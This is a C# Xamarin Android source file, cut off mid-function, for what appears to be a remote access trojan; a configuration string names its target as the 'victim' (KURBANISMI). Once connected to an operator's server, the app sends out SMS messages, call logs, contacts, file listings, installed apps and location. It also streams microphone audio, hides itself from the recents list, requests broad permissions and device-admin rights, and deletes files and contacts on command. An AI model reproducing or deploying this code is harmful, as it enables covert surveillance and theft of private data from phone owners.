using Android.App;
using Android.App.Admin;
using Android.Content;
using Android.Content.PM;
using Android.Database;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Media;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Telephony;
using Android.Views;
using Android.Widget;
//using Plugin.Screenshot;
using System;
using System.Collections.Generic;                 //MADE IN TURKEY - MADE WITH LOVE (:\\
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace Task2
{
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon", ExcludeFromRecents = true)]
    
    public class MainActivity : Activity
    {
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        //readonly string TAG = SERVICE_TYPE.FullName;
        byte[] buffer = new byte[Int16.MaxValue];
        public static Socket Soketimiz = default;
        //Button _startServiceButton;
        //Button _stopServiceButton;
        static Intent _startServiceIntent;
        //static Intent _stopServiceIntent;

        public async void Baglanti_Kur()
        {
            
            await Task.Run(() =>
            {
                try
            {
                    //svde net gidince bağlantı gelmiyor daha
                    //RunOnUiThread(() => { Toast.MakeText(this, "bağlan", ToastLength.Long).Show(); });
                    if(Soketimiz != null) {
                     Soketimiz.Close();
                       }
                    Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPEndPoint endpoint = new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0],
                            MainValues.port);
                        Soketimiz.Connect(endpoint);
                    SetSocketKeepAliveValues(Soketimiz,2000, 1000);
                    Soketimiz.Send(System.Text.Encoding.UTF8.GetBytes("IP|" +
                        MainValues.KRBN_ISMI + "|" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                       + "|" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "|" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "|"));

                        Soketimiz.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(Sunucudan_Gelen_Veriler), Soketimiz);
                }
            catch (SocketException)
            {
                    //Toast.MakeText(this, "socketex", ToastLength.Long).Show();
                //throw ex;
                Baglanti_Kur();
            }
                /*
            catch (System.ComponentModel.Win32Exception)
            {
            Baglanti_Kur();
            }
            catch (Exception)
            {
                Baglanti_Kur();
            }
                */
           
            });
        }

        public void kameraCek(Socket soket)
        {
            UpdateTimeTask.Kamera(soket);
        }
        List<string> allDirectory_ = default;
        List<string> sdCards = default;
        public void dosyalar()
        {
            allDirectory_ = new List<string>();
            try
            {
                Java.IO.File[] _path = GetExternalFilesDirs(null);
                sdCards = new List<string>();
                List<string> allDirectory = new List<string>();
                foreach (var spath in _path)
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");
                        sdCards.Add(s);
                    }
                }
                if (sdCards.Count > 0)
                {
                    listf(sdCards[0]);
                }
                sonAsama(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
                string dosyalarS = "";
                foreach (string inf in allDirectory_)
                {
                    dosyalarS += inf + System.Environment.NewLine;
                }

                byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
                byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|IKISIDE|#" + veri.Length.ToString() + "#|");
                PictureCallback.Send(Soketimiz, uzunluk, 0,
                   uzunluk.Length, 59999);
                PictureCallback.Send(Soketimiz, veri, 0,
                    veri.Length, 59999);
            }
            catch (Exception) { }
        }
        public void sonAsama(string absPath)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(absPath);
                DirectoryInfo[] klasorler = di.GetDirectories();
                FileInfo[] fi = di.GetFiles("*.*");
                foreach (DirectoryInfo directoryInfo in klasorler)
                {
                    allDirectory_.Add(directoryInfo.Name + "=" + directoryInfo.FullName + "=" + "" + "=" + "" + "=CİHAZ="
                         + absPath + "=");
                }
                foreach (FileInfo f_info in fi)
                {
                    if (f_info.DirectoryName.Contains(".thumbnail") == false)
                    {
                        allDirectory_.Add(f_info.Name + "=" + f_info.DirectoryName + "=" + f_info.Extension + "=" + GetFileSizeInBytes(
                            f_info.FullName) + "=CİHAZ=" + absPath + "=");
                    }
                }
            }
            catch (Exception) { }
        }
        public void listf(string directoryName)
        {
            try
            {
                Java.IO.File directory = new Java.IO.File(directoryName);
                Java.IO.File[] fList = directory.ListFiles();
                if (fList != null)
                {
                    foreach (Java.IO.File file in fList)
                    {
                        try
                        {
                            if (file.IsFile)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        file.AbsolutePath.Substring(file.AbsolutePath.LastIndexOf(".")) + "=" + GetFileSizeInBytes(
                                         file.AbsolutePath) + "=SDCARD=" + directoryName + "=");
                            }
                            else if (file.IsDirectory)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        "" + "=" + "" + "=SDCARD=" + directoryName + "=");
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception) { }
        }
        /*
        public static Drawable getIconFromPackageName(string packageName, Context context)
        {
            PackageManager pm = context.PackageManager;
            if (Build.VERSION.SdkInt >= BuildVersionCodes.IceCreamSandwichMr1)
            {
                try
                {
                    PackageInfo pi = pm.GetPackageInfo(packageName, 0);
                    Context otherAppCtx = context.CreatePackageContext(packageName,PackageContextFlags.IgnoreSecurity);

                    
                    int[] displayMetrics = { (int)DisplayMetricsDensity.Xhigh,
                    (int)DisplayMetricsDensity.High, (int)DisplayMetricsDensity.Tv };

                    foreach (int displayMetric in displayMetrics)
                    {
                        try
                        {
                            Drawable d = otherAppCtx.Resources.GetDrawableForDensity(pi.ApplicationInfo.Icon, 
                              displayMetric);
                            if (d != null)
                            {
                                return d;
                            }
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                    }
                }
                catch (Exception){  }
            }

            ApplicationInfo appInfo = null;
            try
            {
                appInfo = pm.GetApplicationInfo(packageName, PackageInfoFlags.MetaData);
            }
            catch (PackageManager.NameNotFoundException)
            {
                return null;
            }

            return appInfo.LoadIcon(pm);
        }
        */
        public void uygulamalar()
        {
            var apps = PackageManager.GetInstalledApplications(PackageInfoFlags.MetaData);
            string bilgiler = "";
            for (int i = 0; i < apps.Count; i++)
            {
                try
                {
                    ApplicationInfo applicationInfo = apps[i];
                    var isim = applicationInfo.LoadLabel(PackageManager);
                    var paket_ismi = applicationInfo.PackageName;
                    /*
                    string app_ico = "";
                    try
                    {
                        app_ico= Convert.ToBase64String(drawableToByteArray(applicationInfo.LoadIcon(PackageManager)));
                    }
                    catch (Exception) { app_ico = "[NULL]"; }
                    */
                    string infos = isim + "=" + paket_ismi + "=";//+ app_ico + "=";
                    bilgiler += infos + "&";
                }
                catch (Exception) { }
            }
            byte[] gidecekler = System.Text.Encoding.UTF8.GetBytes("APPS|" + bilgiler + "|");
            PictureCallback.Send(Soketimiz, gidecekler, 0, gidecekler.Length, 59999);
        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        UdpClient client = null;
        AudioStream audioStream = null;

        public void micSend(string sampleRate, string kaynak)
        {
            AudioSource source = AudioSource.Default;
            switch (kaynak)
            {
                case "Mikrofon":
                    source = AudioSource.Mic;
                    break;
                case "Varsayılan":
                    source = AudioSource.Default;
                    break;
                case "Telefon Görüşmesi":
                    if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
                    mgr.Mode = Mode.InCall;
                    mgr.SetStreamVolume(Android.Media.Stream.VoiceCall, mgr.GetStreamMaxVolume(Android.Media.Stream.VoiceCall), 0);
                    source = AudioSource.Mic;
                    break;
            }
            client = new UdpClient();
            audioStream = new AudioStream(int.Parse(sampleRate), source);
            audioStream.OnBroadcast += AudioStream_OnBroadcast;
            audioStream.Start();
        }

        public void micStop()
        {
            if (audioStream != null)
            {
                audioStream.Stop();
                audioStream.Flush();
                audioStream = null;
                if (client != null)
                {
                    client.Close();
                    client.Dispose();
                }
            }
        }
        private void AudioStream_OnBroadcast(object sender, byte[] e)
        {
            try
            {
                client.Send(e, e.Length, new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port));
                //Toast.MakeText(this, "Paket gönderildi: "+ e.Length.ToString(), ToastLength.Long).Show();
            }
            catch (SocketException)
            {
                micStop();
            }
        }

        public static bool key_gonder = false;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            //SetContentView(Resource.Layout.Main);
           
            Platform.Init(this, savedInstanceState);

            global_activity = this;
            global_packageManager = PackageManager;
            var permissionsToCheck = new string[]
            {
               Android.Manifest.Permission.CaptureAudioOutput,
               Android.Manifest.Permission.ReadPhoneState,
               Android.Manifest.Permission.ModifyAudioSettings,
               Android.Manifest.Permission.BindDeviceAdmin,
               Android.Manifest.Permission.WriteSettings,
               Android.Manifest.Permission.SetWallpaper,
               Android.Manifest.Permission.SendSms,
               Android.Manifest.Permission.CallPhone,
               Android.Manifest.Permission.Vibrate,
               Android.Manifest.Permission.ReadContacts,
               Android.Manifest.Permission.WriteContacts,
               Android.Manifest.Permission.RecordAudio,
               Android.Manifest.Permission.AccessCoarseLocation,
               Android.Manifest.Permission.AccessFineLocation,
               Android.Manifest.Permission.WriteCallLog,
               Android.Manifest.Permission.ReadExternalStorage,
               Android.Manifest.Permission.Camera,
               Android.Manifest.Permission.WriteExternalStorage,
               Android.Manifest.Permission.ForegroundService,
               Android.Manifest.Permission.ReadCallLog,
               Android.Manifest.Permission.ReadSms
            };
            CallNotGrantedPermissions(permissionsToCheck);

            MainValues.IP = Resources.GetString(Resource.String.IP);
            MainValues.port = int.Parse(Resources.GetString(Resource.String.PORT));
            MainValues.KRBN_ISMI = Resources.GetString(Resource.String.KURBANISMI);
            PowerManager pmanager = (PowerManager)GetSystemService("power");
            wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, "PowerDrainer");
            wakelock.SetReferenceCounted(false);
            wakelock.Acquire();
            Baglanti_Kur();
            otogizlen();
            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }
            StartForegroundServiceCompat<ForegroundService>(this);

            /*
             * This code is buggy. If we include this code into the our app, our app stops the work.
         PackageManager p = PackageManager;
         ComponentName componentName = new ComponentName(ApplicationContext, Class);
         p.SetComponentEnabledSetting(componentName,
         ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
         */
        }

        public async void otogizlen()
        {
            await Task.Delay(10000);
            //takeScreenshot(); shit, it returns black backgrounded image...
            Intent main = new Intent(Intent.ActionMain);
            main.AddCategory(Intent.CategoryHome);
            StartActivity(main);
            
            ActivityManager am = (ActivityManager)GetSystemService(ActivityService);
            if (am != null)
            {
                List<ActivityManager.AppTask> tasks = am.AppTasks.ToList();
                if (tasks != null && tasks.Count > 0)
                {
                   
                    tasks[0].SetExcludeFromRecents(true);
                }
            }
			
        }

        private PowerManager.WakeLock wakelock = null;
        public const int RequestCodeEnableAdmin = 15;
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            if (requestCode == RequestCodeEnableAdmin)
            {
                PostSetKioskMode(resultCode == Result.Ok);
            }
            else
                base.OnActivityResult(requestCode, resultCode, data);
        }
        public void Receive(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            try
            {
                //int startTickCount = System.Environment.TickCount;
                int received = 0;
                do
                {
                    //if (System.Environment.TickCount > startTickCount + timeout)
                    //   throw new Exception("Timeout.");
                    try
                    {
                        received += socket.Receive(buffer, offset + received, size - received, SocketFlags.Partial);
                    }
                    catch (SocketException ex)
                    {
                        if (ex.SocketErrorCode == SocketError.WouldBlock ||
                            ex.SocketErrorCode == SocketError.IOPending ||
                            ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                        {

                            Thread.Sleep(30);
                        }
                        else
                        {
                            if (ex.Message.Contains("timed out"))
                            {
                                //Toast.MakeText(MainActivity.global_activity, ex.Message, ToastLength.Long).Show();
                                //((MainActivity)MainActivity.global_activity).Baglanti_Kur();
                                break;
                            }
                            if (ex.SocketErrorCode == SocketError.ConnectionReset)
                            {

                                Baglanti_Kur();
                                break;
                            }
                            /*
                             if(ex.SocketErrorCode == SocketError.ConnectionReset)
                             {
                                ((MainActivity)MainActivity.global_activity).Baglanti_Kur();
                                 break;
                             }
                             else if(ex.SocketErrorCode == SocketError.HostNotFound)
                             {
                                 ((MainActivity)MainActivity.global_activity).Baglanti_Kur();
                                 break;
                             }
                             else
                             {

                             }
                             break;
                            */
                        }
                    }
                    catch (Java.Lang.OutOfMemoryError)
                    {
                        //((MainActivity)MainActivity.global_activity).Baglanti_Kur(); 
                        return;
                    }
                } while (received < size);
            }
            catch (Exception) { }
        }
        /*
        public async void takeScreenshot()
        {
            Install-Package Xam.Plugin.Screenshot -Version 2.0.3

            try
            {
                // image naming and path  to include sd card  appending name you choose for file

                using (MemoryStream ms = new MemoryStream(await CrossScreenshot.Current.CaptureAsync()))
                {
                    string path = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/resim.jpg";
                    File.WriteAllBytes(path, ms.ToArray());
                }

            }
            catch (Exception e)
            {
                throw e;
            }
        }
        */
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
            int rawContactInsertIndex = ops.Count;

            ContentProviderOperation.Builder builder =
                ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
            ops.Add(builder.Build());

            //Name
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
            //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
            ops.Add(builder.Build());

            //Number
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Phone.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                    ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
            ops.Add(builder.Build());
            /*
            //Email
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Email.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Data, Email);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Type,
                ContactsContract.CommonDataKinds.Email.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Label, "Email");
            ops.Add(builder.Build());

            //Address
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredPostal.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.Street, Address1);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.City, Address2);
            ops.Add(builder.Build());
            */
            try
            {
                var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);
                //Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch
            {
                //Toast.MakeText(this, "Contact Not Saved", ToastLength.Long).Show();
            }
        }
        public void ekranGoruntusu()
        {
            var view = Window.DecorView;
            view.DrawingCacheEnabled = true;
            Bitmap bitmap = view.GetDrawingCache(true);
            byte[] bitmapData;
            using (var stream = new MemoryStream())
            {
                bitmap.Compress(Bitmap.CompressFormat.Jpeg, 90, stream);
                bitmapData = stream.ToArray();
            }
            File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/screen.jpg", bitmapData);
            /*
            try
            {
                if (Capture.Length > 0)
                {
                    Capture = PictureCallback.Compress(Capture);
                    byte[] gidecek = System.Text.Encoding.UTF8.GetBytes("SCREENSHOT|" + Capture.Length.ToString());
                    PictureCallback.Send(Soketimiz, gidecek, 0, gidecek.Length, 5999);
                    NetworkStream ns = new NetworkStream(Soketimiz);
                    BinaryWriter binaryWriter = new BinaryWriter(ns);
                    lock (this)
                    {
                        binaryWriter.Write(Capture, 0, Capture.Length);

                        binaryWriter.Flush();
                        //binaryWriter.Close();
                        //binaryWriter.Dispose();
                        ns.Flush();
                        //ns.Close();
                        //ns.Dispose();

                        //Toast.MakeText(MainActivity.global_activity, "SENDED " + bite.Length.ToString(), ToastLength.Long).Show();
                    }
                }
            }
            catch (Exception) { }
            */
        }
        public async void konus(string metin)
        {
            try
            {
                var locales = await TextToSpeech.GetLocalesAsync();
                var locale = locales.FirstOrDefault();

                var settings = new SpeechOptions()
                {
                    Volume = 1.0f,
                    Pitch = 1.0f,
                    Locale = locale
                };

                await TextToSpeech.SpeakAsync(metin, settings);
            }
            catch (Exception) { }
        }
        public void rehberNoSil(string isim)
        {
            Context thisContext = this;
            string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey, ContactsContract.ContactsColumns.DisplayName };
            ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
            while (cursor != null & cursor.MoveToNext())
            {
                string lookupKey = cursor.GetString(0);
                string name = cursor.GetString(1);

                if (name == isim)
                {
                    var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                    thisContext.ContentResolver.Delete(uri, null, null);
                    cursor.Close();
                    return;
                }
            }
        }
        public void DeleteFile_(string filePath)
        {
            try
            {

                new Java.IO.File(filePath).AbsoluteFile.Delete();
                //Toast.MakeText(this, "DELETED", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message + "DELETE", ToastLength.Long).Show();
            }
        }

        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    string sub2 = "Boş";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + GeoCountryName + "=" + admin +
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "{" + location.Longitude + "=");
                    PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
                }
            }
            catch (FeatureNotSupportedException ex)
            {
                byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                               "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                            "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (FeatureNotEnabledException ex)
            {
                byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (PermissionException ex)
            {
                byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (Exception ex)
            {
                byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                file.SetReadable(true);
                string application = "";
                string extension = System.IO.Path.GetExtension(path);
                switch (extension.ToLower())
                {
                    case ".txt":
                        application = "text/plain";
                        break;
                    case ".doc":
                    case ".docx":
                        application = "application/msword";
                        break;
                    case ".pdf":
                        application = "application/pdf";
                        break;
                    case ".xls":
                    case ".xlsx":
                        application = "application/vnd.ms-excel";
                        break;
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                        application = "image/jpeg";
                        break;
                    default:
                        application = "*/*";
                        break;
                }
                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + path);
                Intent intent = new Intent(Intent.ActionView);
                intent.SetDataAndType(uri, application);
                intent.SetFlags(ActivityFlags.ClearTop);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(this, nereden);
            veri.smsLeriCek();
            string gidecek_veriler = "";
            var sms_ = veri.smsler;
            for (int i = 0; i < sms_.Count; i++)
            {

                string bilgiler = sms_[i].Gonderen + "{" + sms_[i].Icerik + "{"
                + sms_[i].Tarih + "{" + LogVerileri.SMS_TURU + "{" + sms_[i].Isim + "{";

                gidecek_veriler += bilgiler + "&";

            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }
            byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("SMSLOGU|#" + gidecek_Veri.Length.ToString() + "#|");
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim +"="+list[i].Numara + "=" + list[i].Tarih + "="
                    + list[i].Durasyon + "=" + list[i].Tip + "=");

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
            byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("CAGRIKAYITLARI|#" + gidecek_Veri.Length.ToString() + "#|");
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "="
                    );

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }
            byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
            byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("REHBER|#" + gidecek_Veri.Length.ToString() + "#|");
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
        }
        public bool SetKioskMode(bool enable)
        {
            var deviceAdmin =
                new ComponentName(this, Java.Lang.Class.FromType(typeof(AdminReceiver)));
            if (enable)
            {
                var intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, deviceAdmin);
                // intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "activity.getString(R.string.add_admin_extra_app_text");
                StartActivityForResult(intent, RequestCodeEnableAdmin);
                return false;
            }
            else
            {
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                devicePolicyManager.RemoveActiveAdmin(deviceAdmin);
                return true;
            }
        }

        private void PostSetKioskMode(bool enable)
        {
            if (enable)
            {
                var deviceAdmin = new ComponentName(this,
                    Java.Lang.Class.FromType(typeof(AdminReceiver)));
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                if (!devicePolicyManager.IsAdminActive(deviceAdmin)) throw new Exception("Not Admin");

                StartLockTask();
            }
            else
            {
                StopLockTask();
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }

        protected override void OnDestroy()
        {
            base.OnDestroy();
        }

        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null) where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);

            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }

        private void CallNotGrantedPermissions(string[] permissionsToCheck)
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                var permissionStillNeeded = GetNotGrantedPermissions(permissionsToCheck);
                if (permissionStillNeeded.Length > 0)
                {
                    RequestPermissions(permissionStillNeeded, 5);
                }
            }
        }

        private string[] GetNotGrantedPermissions(string[] permissionsToCheck)
        {
            var permissionStillNeeded = new List<string>();
            for (int i = 0; i < permissionsToCheck.Length; i++)
            {
                if (Permission.Granted != CheckSelfPermission(permissionsToCheck[i]))
                    permissionStillNeeded.Add(permissionsToCheck[i]);
            }

            return permissionStillNeeded.ToArray();
        }
        public void javaFileWrite(byte[] veri, string yol)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(yol);
                if (file.Exists())
                {
                    file.Delete();
                }
                Java.IO.FileOutputStream fos = new Java.IO.FileOutputStream(file);
                fos.Write(veri);
                fos.Close();
                //fos.Flush();
                fos.Dispose();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message, ToastLength.Long)
                //.Show();
            }
        }
        public async void DosyaIndir(string uri, string filename)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/" +
                    filename, await wc.DownloadDataTaskAsync(uri));
                }
                try
                {
                    byte[] basarili = System.Text.Encoding.UTF8.GetBytes("INDIRILDI|Dosya başarılı bir şekilde indi.|");
                    PictureCallback.Send(Soketimiz, basarili, 0, basarili.Length, 59999);
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
